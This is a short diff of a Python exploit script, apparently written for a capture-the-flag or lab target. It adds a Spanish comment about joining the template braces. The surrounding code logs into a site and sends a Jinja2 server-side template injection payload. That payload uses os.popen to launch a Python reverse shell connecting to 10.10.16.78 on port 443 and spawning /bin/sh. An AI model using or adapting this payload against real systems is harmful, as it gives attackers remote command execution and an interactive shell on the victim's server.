@@ -61,6 +61,7 @@ class Exploit():
 
 		r = s.post(self.__subdomain+'/login', data=data_login)
 		# Cambiar IP por la vuestra
+		# Juntar llaves de SSTI de principio y fin
 		data_ssti = {
 			'name': r'''{ { cycler.__init__.__globals__.os.popen("""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.78\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'""").read() } }'''
 		}
